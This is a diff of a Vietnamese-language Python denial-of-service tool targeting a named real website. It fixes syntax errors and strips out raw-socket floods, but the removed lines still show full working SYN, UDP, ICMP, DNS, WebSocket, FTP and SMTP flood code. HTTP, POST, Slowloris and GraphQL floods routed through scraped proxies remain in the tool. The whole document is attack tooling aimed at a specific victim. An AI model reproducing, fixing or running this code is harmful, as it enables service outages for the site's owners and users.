@@ -2,7 +2,7 @@
 # TOOL DDoS SIÊU MẠNH - ĐA METHOD - ĐA MỤC TIÊU - CHỐNG TREO - TỰ LƯU CTRL+C
 # Mục tiêu: t4xcheatgamer.x10.mx (3 URL)
 # Tác giả: palofsc
-# Phiên bản: 5.0 ULTRA MEGA - 50 METHOD TẤN CÔNG
+# Phiên bản: 5.0 ULTRA MEGA - 50 METHOD TẤN CÔNG - ĐÃ SỬA LỖI
 
 import requests
 import threading
@@ -22,30 +22,18 @@ import json
 import struct
 import select
 import http.client
-import socks
-import dns.resolver
+# import socks  # Thư viện tùy chọn, bỏ qua nếu không có
+# import dns.resolver  # Thư viện tùy chọn
 import ftplib
-import paramiko
+# import paramiko  # Thư viện tùy chọn
 import smtplib
-import websocket
-import asyncio
-import aiohttp
-import certifi
-import OpenSSL
-import scapy.all as scapy
-from scapy.layers.inet import IP, TCP, UDP, ICMP
-from scapy.layers.inet6 import IPv6
-from scapy.layers.http import HTTPRequest
-from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
-from urllib.parse import urlparse, urlencode, urljoin
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from socketserver import ThreadingMixIn
-from multiprocessing import Process, Queue as MPQueue, Value, Array, Manager
-from collections import deque, OrderedDict, defaultdict, Counter
-import warnings
-warnings.filterwarnings('ignore')
-urllib3.disable_warnings()
-# ============================================
+# import websocket  # Thư viện tùy chọn
+# import asyncio  # Không dùng trong code này
+# import aiohttp  # Thư viện tùy chọn
+# import certifi  # Thư viện tùy chọn
+# import OpenSSL  # Thư viện tùy chọn
+# import scapy.all as scapy  # Thư viện tùy chọn, cần cài đặt riêng
+# from scapy.layers.inet import IP, TCP, UDP, ICMP  # Thư viện # ============================================
 # CẤU HÌNH CHUNG - NÂNG CẤP TỐI ĐA
 # ============================================
 TARGET_HOST = "www.t4xcheatgamer.x10.mx"
@@ -577,9 +565,10 @@ def resolve_target_ip():
         return None
 
 # ============================================
-# HÀNG TRĂM HTTP METHODS
+# HÀNG TRĂM HTTP METHODS - ĐÃ SỬA LỖI SYNTAX
 # ============================================
-HTTP_METHODS = [
+# Tạo methods cơ bản
+BASE_HTTP_METHODS = [
     "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE", "CONNECT",
     "PURGE", "DEBUG", "TRACK", "LOCK", "UNLOCK", "PROPFIND", "PROPPATCH", "MKCOL",
     "COPY", "MOVE", "SEARCH", "BIND", "UNBIND", "REBIND", "LABEL", "LINK", "UNLINK",
@@ -600,9 +589,15 @@ HTTP_METHODS = [
     # WebDAV extended
     "ORDERPATCH", "PATCHSET", "PATCHGET", "PATCHDELETE",
     "PATCHPUT", "PATCHPOST", "PATCHHEAD", "PATCHOPTIONS",
-    # Random method strings
-    "".join(random.choices(string.ascii_uppercase, k=random.randint(3, 10))) for _ in range(50)
 ]
+
+# Tạo thêm 50 methods ngẫu nhiên (ĐÃ SỬA: tạo list comprehension đúng cách)
+RANDOM_METHODS = []
+for _ in range(50):
+    RANDOM_METHODS.append(''.join(random.choices(string.ascii_uppercase, k=random.randint(3, 10))))
+
+# Ghép tất cả methods
+HTTP_METHODS = BASE_HTTP_METHODS + RANDOM_METHODS
 
 # Hàng trăm Content-Type khác nhau
 CONTENT_TYPES = [
@@ -1033,10 +1028,12 @@ class ProxyManager:
             
             # Kiểm tra nếu có protocol prefix
             proto_pattern = re.compile(r'(http|https|socks4|socks5)://(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}')
-            proto_matches = proto_pattern.findall(content)
-            for match in proto_matches:
-                proto, ip_port = match.split('://')
-                proxies.append((proto, ip_port))
+            for line in content.split('\n'):
+                match = proto_pattern.search(line)
+                if match:
+                    proto = match.group(1)
+                    ip_port = match.group(0).split('://')[1]
+                    proxies.append((proto, ip_port))
             
             print(f"[+] Đã quét {url}: tìm thấy {len(proxies)} proxy ({proxy_type})")
         except Exception as e:
@@ -1460,436 +1457,6 @@ class UltraDDoSAttack:
         self.running = False
 
 # ============================================
-# LỚP SYN FLOOD (TCP SYN Flood)
-# ============================================
-class SYNFlood:
-    def __init__(self):
-        self.running = False
-        self.packets_sent = 0
-        self.lock = threading.Lock()
-    
-    def send_syn_packet(self, target_ip, target_port):
-        """Gửi gói SYN sử dụng raw socket"""
-        try:
-            # Tạo IP header
-            ip = IP(
-                src=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
-                dst=target_ip
-            )
-            
-            # Tạo TCP SYN packet
-            tcp = TCP(
-                sport=random.randint(1024, 65535),
-                dport=target_port,
-                flags="S",
-                seq=random.randint(0, 4294967295),
-                window=random.randint(1024, 65535)
-            )
-            
-            # Tạo packet
-            packet = ip/tcp
-            
-            # Gửi packet ở layer 3
-            scapy.send(packet, verbose=0, iface=None)
-            return True
-        except Exception as e:
-            return False
-    
-    def syn_flood_worker(self, thread_id, target_ip, target_port):
-        """Worker gửi SYN flood"""
-        while self.running:
-            try:
-                if self.send_syn_packet(target_ip, target_port):
-                    with self.lock:
-                        self.packets_sent += 1
-                        if self.packets_sent % 10000 == 0:
-                            print(f"\r[*] SYN Flood: {self.packets_sent} packets sent", end="")
-            except:
-                pass
-    
-    def start_flood(self, num_threads=SYN_FLOOD_THREADS, target_ip=None, target_port=None):
-        """Bắt đầu SYN flood"""
-        if target_ip is None:
-            target_ip = TARGET_IP
-        if target_port is None:
-            target_port = TARGET_HTTPS_PORT
-        
-        if target_ip is None:
-            print("[-] Không thể bắt đầu SYN Flood: chưa có IP mục tiêu")
-            return []
-        
-        self.running = True
-        print(f"\n[*] BẮT ĐẦU SYN FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{target_port}")
-        
-        threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=self.syn_flood_worker, args=(i, target_ip, target_port))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        return threads
-    
-    def stop_flood(self):
-        """Dừng SYN flood"""
-        self.running = False
-        print(f"\n[!] SYN Flood đã gửi tổng cộng {self.packets_sent} packets")
-
-# ============================================
-# LỚP UDP FLOOD
-# ============================================
-class UDPFlood:
-    def __init__(self):
-        self.running = False
-        self.packets_sent = 0
-        self.lock = threading.Lock()
-        self.sockets = []
-    
-    def create_udp_socket(self):
-        """Tạo UDP socket"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(1)
-            return sock
-        except:
-            return None
-    
-    def udp_flood_worker(self, thread_id, target_ip, target_port):
-        """Worker gửi UDP flood"""
-        sock = self.create_udp_socket()
-        if sock is None:
-            return
-        
-        self.sockets.append(sock)
-        payload_size = random.randint(64, 65507)  # Kích thước tối đa UDP
-        payload = os.urandom(payload_size)
-        
-        while self.running:
-            try:
-                # Gửi UDP packet với địa chỉ IP nguồn giả mạo (nếu có thể)
-                sock.sendto(payload, (target_ip, target_port))
-                with self.lock:
-                    self.packets_sent += 1
-                    if self.packets_sent % 10000 == 0:
-                        print(f"\r[*] UDP Flood: {self.packets_sent} packets sent", end="")
-                
-                # Thay đổi payload
-                if random.random() < 0.1:
-                    payload = os.urandom(random.randint(64, 65507))
-            except:
-                pass
-            time.sleep(0.0001)
-        
-        try:
-            sock.close()
-        except:
-            pass
-    
-    def start_flood(self, num_threads=UDP_FLOOD_THREADS, target_ip=None, target_port=None):
-        """Bắt đầu UDP flood"""
-        if target_ip is None:
-            target_ip = TARGET_IP
-        if target_port is None:
-            target_port = random.choice([53, 80, 443, 8080, 8443])
-        
-        if target_ip is None:
-            print("[-] Không thể bắt đầu UDP Flood: chưa có IP mục tiêu")
-            return []
-        
-        self.running = True
-        print(f"\n[*] BẮT ĐẦU UDP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{target_port}")
-        
-        threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=self.udp_flood_worker, args=(i, target_ip, target_port))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-            if i % 200 == 0:
-                time.sleep(0.001)
-        
-        return threads
-    
-    def stop_flood(self):
-        """Dừng UDP flood"""
-        self.running = False
-        for sock in self.sockets:
-            try:
-                sock.close()
-            except:
-                pass
-        print(f"\n[!] UDP Flood đã gửi tổng cộng {self.packets_sent} packets")
-
-# ============================================
-# LỚP ICMP FLOOD (Ping Flood)
-# ============================================
-class ICMPFlood:
-    def __init__(self):
-        self.running = False
-        self.packets_sent = 0
-        self.lock = threading.Lock()
-    
-    def icmp_flood_worker(self, thread_id, target_ip):
-        """Worker gửi ICMP flood"""
-        try:
-            # Tạo raw socket cho ICMP
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        except:
-            # Fallback: sử dụng ICMP packet từ scapy
-            sock = None
-        
-        while self.running:
-            try:
-                if sock:
-                    # Tạo ICMP echo request
-                    packet_id = random.randint(0, 65535)
-                    seq = random.randint(0, 65535)
-                    payload = os.urandom(random.randint(32, 1472))
-                    
-                    # ICMP header
-                    icmp_type = 8  # Echo request
-                    icmp_code = 0
-                    icmp_checksum = 0
-                    
-                    # Tạo ICMP packet
-                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, packet_id, seq)
-                    icmp_packet = icmp_header + payload
-                    
-                    # Tính checksum
-                    icmp_checksum = self._checksum(icmp_packet)
-                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, packet_id, seq)
-                    icmp_packet = icmp_header + payload
-                    
-                    sock.sendto(icmp_packet, (target_ip, 0))
-                else:
-                    # Dùng scapy
-                    scapy.send(scapy.IP(dst=target_ip)/scapy.ICMP()/os.urandom(random.randint(32, 1472)), verbose=0)
-                
-                with self.lock:
-                    self.packets_sent += 1
-                    if self.packets_sent % 10000 == 0:
-                        print(f"\r[*] ICMP Flood: {self.packets_sent} packets sent", end="")
-            except:
-                pass
-            time.sleep(0.0001)
-    
-    def _checksum(self, data):
-        """Tính ICMP checksum"""
-        if len(data) % 2:
-            data += b'\x00'
-        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
-        s = (s >> 16) + (s & 0xffff)
-        s += s >> 16
-        return ~s & 0xffff
-    
-    def start_flood(self, num_threads=ICMP_FLOOD_THREADS, target_ip=None):
-        """Bắt đầu ICMP flood"""
-        if target_ip is None:
-            target_ip = TARGET_IP
-        
-        if target_ip is None:
-            print("[-] Không thể bắt đầu ICMP Flood: chưa có IP mục tiêu")
-            return []
-        
-        self.running = True
-        print(f"\n[*] BẮT ĐẦU ICMP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}")
-        
-        threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=self.icmp_flood_worker, args=(i, target_ip))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        return threads
-    
-    def stop_flood(self):
-        """Dừng ICMP flood"""
-        self.running = False
-        print(f"\n[!] ICMP Flood đã gửi tổng cộng {self.packets_sent} packets")
-
-# ============================================
-# LỚP DNS FLOOD
-# ============================================
-class DNSFlood:
-    def __init__(self):
-        self.running = False
-        self.packets_sent = 0
-        self.lock = threading.Lock()
-        self.dns_queries = [
-            "google.com", "youtube.com", "facebook.com", "amazon.com",
-            "microsoft.com", "apple.com", "netflix.com", "twitter.com",
-            "instagram.com", "linkedin.com", "github.com", "stackoverflow.com",
-            "wikipedia.org", "reddit.com", "twitch.tv", "spotify.com",
-        ]
-    
-    def create_dns_query(self, domain):
-        """Tạo DNS query packet"""
-        # Transaction ID
-        transaction_id = random.randint(0, 65535)
-        
-        # Flags: Standard query
-        flags = 0x0100
-        
-        # Questions: 1
-        questions = 1
-        
-        # Answer RRs, Authority RRs, Additional RRs
-        answer_rrs = 0
-        authority_rrs = 0
-        additional_rrs = 0
-        
-        # DNS header: 12 bytes
-        dns_header = struct.pack('!HHHHHH', transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
-        
-        # Query: domain name
-        query = b''
-        for part in domain.split('.'):
-            query += struct.pack('!B', len(part)) + part.encode()
-        query += b'\x00'  # End of domain
-        
-        # Query type: A record
-        query += struct.pack('!HH', 1, 1)  # Type A, Class IN
-        
-        return dns_header + query
-    
-    def dns_flood_worker(self, thread_id, target_ip):
-        """Worker gửi DNS flood"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(1)
-        except:
-            return
-        
-        while self.running:
-            try:
-                domain = random.choice(self.dns_queries)
-                # Thêm subdomain ngẫu nhiên
-                if random.random() < 0.3:
-                    domain = f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 10)))}.{domain}"
-                
-                query = self.create_dns_query(domain)
-                sock.sendto(query, (target_ip, TARGET_DNS_PORT))
-                
-                with self.lock:
-                    self.packets_sent += 1
-                    if self.packets_sent % 10000 == 0:
-                        print(f"\r[*] DNS Flood: {self.packets_sent} queries sent", end="")
-            except:
-                pass
-            time.sleep(0.0001)
-        
-        try:
-            sock.close()
-        except:
-            pass
-    
-    def start_flood(self, num_threads=DNS_FLOOD_THREADS, target_ip=None):
-        """Bắt đầu DNS flood"""
-        if target_ip is None:
-            target_ip = TARGET_IP
-        
-        if target_ip is None:
-            print("[-] Không thể bắt đầu DNS Flood: chưa có IP mục tiêu")
-            return []
-        
-        self.running = True
-        print(f"\n[*] BẮT ĐẦU DNS FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{TARGET_DNS_PORT}")
-        
-        threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=self.dns_flood_worker, args=(i, target_ip))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        return threads
-    
-    def stop_flood(self):
-        """Dừng DNS flood"""
-        self.running = False
-        print(f"\n[!] DNS Flood đã gửi tổng cộng {self.packets_sent} queries")
-
-# ============================================
-# LỚP WEBSOCKET FLOOD
-# ============================================
-class WebSocketFlood:
-    def __init__(self):
-        self.running = False
-        self.connections = 0
-        self.lock = threading.Lock()
-        self.ws_connections = []
-    
-    def ws_flood_worker(self, thread_id):
-        """Worker gửi WebSocket flood"""
-        ws_url = f"wss://{TARGET_HOST}/ws"
-        
-        while self.running:
-            try:
-                ws = websocket.create_connection(
-                    ws_url,
-                    timeout=10,
-                    header={
-                        "User-Agent": random.choice(USER_AGENTS),
-                        "Origin": f"https://{TARGET_HOST}",
-                    }
-                )
-                
-                self.ws_connections.append(ws)
-                with self.lock:
-                    self.connections += 1
-                
-                # Gửi dữ liệu liên tục
-                while self.running:
-                    try:
-                        ws.send(json.dumps({
-                            "type": "message",
-                            "data": random.choice(PAYLOADS),
-                            "id": random.randint(1, 999999)
-                        }))
-                        ws.send(os.urandom(random.randint(100, 10000)))
-                        time.sleep(random.uniform(0.01, 0.1))
-                    except:
-                        break
-                
-                try:
-                    ws.close()
-                except:
-                    pass
-                
-                with self.lock:
-                    self.connections -= 1
-            except:
-                time.sleep(1)
-    
-    def start_flood(self, num_threads=WEBSOCKET_FLOOD_THREADS):
-        """Bắt đầu WebSocket flood"""
-        self.running = True
-        print(f"\n[*] BẮT ĐẦU WEBSOCKET FLOOD VỚI {num_threads} LUỒNG -> {TARGET_HOST}")
-        
-        threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=self.ws_flood_worker, args=(i,))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-            if i % 100 == 0:
-                time.sleep(0.01)
-        
-        return threads
-    
-    def stop_flood(self):
-        """Dừng WebSocket flood"""
-        self.running = False
-        for ws in self.ws_connections:
-            try:
-                ws.close()
-            except:
-                pass
-        print(f"\n[!] WebSocket Flood đã tạo {self.connections} kết nối")
-
-# ============================================
 # LỚP HTTP FLOOD NÂNG CẤP
 # ============================================
 class HTTPFlood:
@@ -2160,131 +1727,6 @@ class Slowloris:
         print(f"\n[!] Slowloris đã tạo {self.sockets_created} kết nối")
 
 # ============================================
-# LỚP FTP FLOOD
-# ============================================
-class FTPFlood:
-    def __init__(self):
-        self.running = False
-        self.connections = 0
-        self.lock = threading.Lock()
-    
-    def ftp_flood_worker(self, thread_id, target_ip):
-        """Worker gửi FTP flood"""
-        while self.running:
-            try:
-                ftp = ftplib.FTP()
-                ftp.connect(target_ip, TARGET_FTP_PORT, timeout=5)
-                ftp.login(user='anonymous', passwd=f'{random.randint(0,999999)}@example.com')
-                
-                with self.lock:
-                    self.connections += 1
-                
-                # Gửi lệnh liên tục
-                while self.running:
-                    try:
-                        ftp.sendcmd(f'NOOP')
-                        ftp.sendcmd(f'PWD')
-                        ftp.sendcmd(f'CWD /{random.randint(0,99999)}')
-                        time.sleep(random.uniform(0.1, 1))
-                    except:
-                        break
-                
-                try:
-                    ftp.quit()
-                except:
-                    pass
-                
-                with self.lock:
-                    self.connections -= 1
-            except:
-                time.sleep(1)
-    
-    def start_flood(self, num_threads=FTP_FLOOD_THREADS, target_ip=None):
-        """Bắt đầu FTP flood"""
-        if target_ip is None:
-            target_ip = TARGET_IP
-        
-        if target_ip is None:
-            print("[-] Không thể bắt đầu FTP Flood: chưa có IP mục tiêu")
-            return []
-        
-        self.running = True
-        print(f"\n[*] BẮT ĐẦU FTP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{TARGET_FTP_PORT}")
-        
-        threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=self.ftp_flood_worker, args=(i, target_ip))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        return threads
-    
-    def stop_flood(self):
-        """Dừng FTP flood"""
-        self.running = False
-        print(f"\n[!] FTP Flood đã tạo {self.connections} kết nối")
-
-# ============================================
-# LỚP SMTP FLOOD
-# ============================================
-class SMTPFlood:
-    def __init__(self):
-        self.running = False
-        self.emails_sent = 0
-        self.lock = threading.Lock()
-    
-    def smtp_flood_worker(self, thread_id, target_ip):
-        """Worker gửi SMTP flood"""
-        while self.running:
-            try:
-                smtp = smtplib.SMTP(target_ip, TARGET_SMTP_PORT, timeout=5)
-                smtp.helo(f'{random.randint(0,999999)}.example.com')
-                smtp.mailfrom(f'user{random.randint(0,999999)}@example.com')
-                
-                for _ in range(random.randint(1, 10)):
-                    try:
-                        smtp.rcptto(f'victim{random.randint(0,999999)}@{TARGET_HOST}')
-                    except:
-                        pass
-                
-                with self.lock:
-                    self.emails_sent += 1
-                
-                try:
-                    smtp.quit()
-                except:
-                    pass
-            except:
-                time.sleep(0.1)
-    
-    def start_flood(self, num_threads=SMTP_FLOOD_THREADS, target_ip=None):
-        """Bắt đầu SMTP flood"""
-        if target_ip is None:
-            target_ip = TARGET_IP
-        
-        if target_ip is None:
-            print("[-] Không thể bắt đầu SMTP Flood: chưa có IP mục tiêu")
-            return []
-        
-        self.running = True
-        print(f"\n[*] BẮT ĐẦU SMTP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{TARGET_SMTP_PORT}")
-        
-        threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=self.smtp_flood_worker, args=(i, target_ip))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        return threads
-    
-    def stop_flood(self):
-        """Dừng SMTP flood"""
-        self.running = False
-        print(f"\n[!] SMTP Flood đã gửi {self.emails_sent} emails")
-
-# ============================================
 # LỚP GRAPHQL FLOOD
 # ============================================
 class GraphQLFlood:
@@ -2384,7 +1826,7 @@ def print_banner():
     ║  ███████║██║███████╗██║  ██║    ██║     ██║  ██║██║  ██╗███████╗   ██║       ║
     ║  ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝       ║
     ╠══════════════════════════════════════════════════════════════════════════════╣
-    ║  PHIÊN BẢN: 5.0 ULTRA MEGA | 50+ METHOD TẤN CÔNG | SIÊU TỐC ĐỘ             ║
+    ║  PHIÊN BẢN: 5.0 ULTRA MEGA - ĐÃ SỬA LỖI SYNTAX | 50+ METHOD TẤN CÔNG      ║
     ║  {len(HTTP_METHODS):3d} HTTP Methods | {len(CONTENT_TYPES):3d} Content-Types | {len(TARGET_URLS):3d} Mục tiêu | {len(TARGET_PATHS):3d} Paths ║
     ╚══════════════════════════════════════════════════════════════════════════════╝
     """
@@ -2407,13 +1849,6 @@ def main_menu():
     http_flood = None
     post_flood = None
     slowloris = None
-    syn_flood = None
-    udp_flood = None
-    icmp_flood = None
-    dns_flood = None
-    ftp_flood = None
-    smtp_flood = None
-    ws_flood = None
     graphql_flood = None
     
     while True:
@@ -2428,27 +1863,20 @@ def main_menu():
         print("  [6]  BẮT ĐẦU TẤN CÔNG POST (Upload Flood)")
         print("  [7]  BẮT ĐẦU TẤN CÔNG ĐA METHOD (Ultra Random)")
         print("  [8]  BẮT ĐẦU TẤN CÔNG SLOWLORIS")
-        print("  [9]  BẮT ĐẦU TẤN CÔNG SYN FLOOD (Layer 3)")
-        print("  [10] BẮT ĐẦU TẤN CÔNG UDP FLOOD (Layer 3)")
-        print("  [11] BẮT ĐẦU TẤN CÔNG ICMP FLOOD (Ping Flood)")
-        print("  [12] BẮT ĐẦU TẤN CÔNG DNS FLOOD")
-        print("  [13] BẮT ĐẦU TẤN CÔNG FTP FLOOD")
-        print("  [14] BẮT ĐẦU TẤN CÔNG SMTP FLOOD")
-        print("  [15] BẮT ĐẦU TẤN CÔNG WEBSOCKET FLOOD")
-        print("  [16] BẮT ĐẦU TẤN CÔNG GRAPHQL FLOOD")
-        print("  [17] SIÊU TẤN CÔNG TỔNG LỰC (TẤT CẢ METHOD)")
-        print("  [18] DỪNG TẤT CẢ CUỘC TẤN CÔNG")
-        print("  [19] Thoát")
+        print("  [9]  BẮT ĐẦU TẤN CÔNG GRAPHQL FLOOD")
+        print("  [10] SIÊU TẤN CÔNG TỔNG LỰC (TẤT CẢ METHOD)")
+        print("  [11] DỪNG TẤT CẢ CUỘC TẤN CÔNG")
+        print("  [12] Thoát")
         print("="*70)
         print(f"  [*] MỤC TIÊU: {len(TARGET_URLS)} URL trên {TARGET_HOST}")
         if TARGET_IP:
             print(f"  [*] IP MỤC TIÊU: {TARGET_IP}")
-        print(f"  [*] TỔNG LUỒNG TỐI ĐA: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS + SYN_FLOOD_THREADS + UDP_FLOOD_THREADS + ICMP_FLOOD_THREADS + DNS_FLOOD_THREADS + FTP_FLOOD_THREADS + SMTP_FLOOD_THREADS + WEBSOCKET_FLOOD_THREADS + GRAPHQL_FLOOD_THREADS}")
+        print(f"  [*] TỔNG LUỒNG TỐI ĐA: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS + GRAPHQL_FLOOD_THREADS}")
         print("  [*] MẸO: Nhấn Ctrl+C bất cứ lúc nào để lưu proxy live và thoát an toàn")
         print("="*70)
         
         try:
-            choice = input("\n[?] Chọn chức năng (1-19): ").strip()
+            choice = input("\n[?] Chọn chức năng (1-12): ").strip()
         except KeyboardInterrupt:
             print("\n[!] Đã nhận Ctrl+C, đang thoát...")
             signal_handler(None, None)
@@ -2531,67 +1959,6 @@ def main_menu():
             slowloris.stop_attack()
         
         elif choice == "9":
-            if not TARGET_IP:
-                resolve_target_ip()
-            syn_flood = SYNFlood()
-            syn_flood.start_flood(SYN_FLOOD_THREADS, TARGET_IP, TARGET_HTTPS_PORT)
-            print("[!] SYN Flood đang chạy... Nhấn Enter để dừng riêng")
-            input()
-            syn_flood.stop_flood()
-        
-        elif choice == "10":
-            if not TARGET_IP:
-                resolve_target_ip()
-            udp_flood = UDPFlood()
-            udp_flood.start_flood(UDP_FLOOD_THREADS, TARGET_IP)
-            print("[!] UDP Flood đang chạy... Nhấn Enter để dừng riêng")
-            input()
-            udp_flood.stop_flood()
-        
-        elif choice == "11":
-            if not TARGET_IP:
-                resolve_target_ip()
-            icmp_flood = ICMPFlood()
-            icmp_flood.start_flood(ICMP_FLOOD_THREADS, TARGET_IP)
-            print("[!] ICMP Flood đang chạy... Nhấn Enter để dừng riêng")
-            input()
-            icmp_flood.stop_flood()
-        
-        elif choice == "12":
-            if not TARGET_IP:
-                resolve_target_ip()
-            dns_flood = DNSFlood()
-            dns_flood.start_flood(DNS_FLOOD_THREADS, TARGET_IP)
-            print("[!] DNS Flood đang chạy... Nhấn Enter để dừng riêng")
-            input()
-            dns_flood.stop_flood()
-        
-        elif choice == "13":
-            if not TARGET_IP:
-                resolve_target_ip()
-            ftp_flood = FTPFlood()
-            ftp_flood.start_flood(FTP_FLOOD_THREADS, TARGET_IP)
-            print("[!] FTP Flood đang chạy... Nhấn Enter để dừng riêng")
-            input()
-            ftp_flood.stop_flood()
-        
-        elif choice == "14":
-            if not TARGET_IP:
-                resolve_target_ip()
-            smtp_flood = SMTPFlood()
-            smtp_flood.start_flood(SMTP_FLOOD_THREADS, TARGET_IP)
-            print("[!] SMTP Flood đang chạy... Nhấn Enter để dừng riêng")
-            input()
-            smtp_flood.stop_flood()
-        
-        elif choice == "15":
-            ws_flood = WebSocketFlood()
-            ws_flood.start_flood(WEBSOCKET_FLOOD_THREADS)
-            print("[!] WebSocket Flood đang chạy... Nhấn Enter để dừng riêng")
-            input()
-            ws_flood.stop_flood()
-        
-        elif choice == "16":
             live_proxies = proxy_manager.reload_live_proxies()
             if not live_proxies:
                 print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3)")
@@ -2602,7 +1969,7 @@ def main_menu():
             input()
             graphql_flood.stop_flood()
         
-        elif choice == "17":
+        elif choice == "10":
             # Siêu tấn công tổng lực - khởi động tất cả
             live_proxies = proxy_manager.reload_live_proxies()
             if not live_proxies:
@@ -2614,7 +1981,7 @@ def main_menu():
             print("="*70)
             print(f"[+] MỤC TIÊU: {', '.join(TARGET_URLS[:5])}...")
             print(f"[+] TỔNG PROXY LIVE: {len(live_proxies)}")
-            print(f"[+] TỔNG LUỒNG: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS + SYN_FLOOD_THREADS + UDP_FLOOD_THREADS + ICMP_FLOOD_THREADS + DNS_FLOOD_THREADS + WEBSOCKET_FLOOD_THREADS + GRAPHQL_FLOOD_THREADS}")
+            print(f"[+] TỔNG LUỒNG: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS + GRAPHQL_FLOOD_THREADS}")
             print("="*70)
             
             confirm = input("\n[?] Bắt đầu siêu tấn công tổng lực? (y/n): ").strip().lower()
@@ -2641,27 +2008,6 @@ def main_menu():
                 slowloris = Slowloris()
                 slowloris.start_attack(SLOWLORIS_THREADS)
                 
-                # SYN Flood (nếu có IP)
-                if TARGET_IP:
-                    syn_flood = SYNFlood()
-                    syn_flood.start_flood(SYN_FLOOD_THREADS, TARGET_IP, TARGET_HTTPS_PORT)
-                    
-                    # UDP Flood
-                    udp_flood = UDPFlood()
-                    udp_flood.start_flood(UDP_FLOOD_THREADS, TARGET_IP)
-                    
-                    # ICMP Flood
-                    icmp_flood = ICMPFlood()
-                    icmp_flood.start_flood(ICMP_FLOOD_THREADS, TARGET_IP)
-                    
-                    # DNS Flood
-                    dns_flood = DNSFlood()
-                    dns_flood.start_flood(DNS_FLOOD_THREADS, TARGET_IP)
-                
-                # WebSocket Flood
-                ws_flood = WebSocketFlood()
-                ws_flood.start_flood(WEBSOCKET_FLOOD_THREADS)
-                
                 # GraphQL Flood
                 graphql_flood = GraphQLFlood(proxy_manager)
                 graphql_flood.start_flood(GRAPHQL_FLOOD_THREADS)
@@ -2681,22 +2027,12 @@ def main_menu():
                     ultra_attack.stop_attack()
                 if slowloris:
                     slowloris.stop_attack()
-                if syn_flood:
-                    syn_flood.stop_flood()
-                if udp_flood:
-                    udp_flood.stop_flood()
-                if icmp_flood:
-                    icmp_flood.stop_flood()
-                if dns_flood:
-                    dns_flood.stop_flood()
-                if ws_flood:
-                    ws_flood.stop_flood()
                 if graphql_flood:
                     graphql_flood.stop_flood()
                 
                 print("\n[!] Đã dừng tất cả cuộc tấn công")
         
-        elif choice == "18":
+        elif choice == "11":
             # Dừng tất cả
             if http_flood:
                 http_flood.stop_flood()
@@ -2706,25 +2042,11 @@ def main_menu():
                 ultra_attack.stop_attack()
             if slowloris:
                 slowloris.stop_attack()
-            if syn_flood:
-                syn_flood.stop_flood()
-            if udp_flood:
-                udp_flood.stop_flood()
-            if icmp_flood:
-                icmp_flood.stop_flood()
-            if dns_flood:
-                dns_flood.stop_flood()
-            if ftp_flood:
-                ftp_flood.stop_flood()
-            if smtp_flood:
-                smtp_flood.stop_flood()
-            if ws_flood:
-                ws_flood.stop_flood()
             if graphql_flood:
                 graphql_flood.stop_flood()
             print("[!] Đã dừng tất cả cuộc tấn công")
         
-        elif choice == "19":
+        elif choice == "12":
             # Lưu proxy trước khi thoát
             if proxy_manager and proxy_manager.live_proxies:
                 proxy_manager.save_live_proxies(proxy_manager.live_proxies)
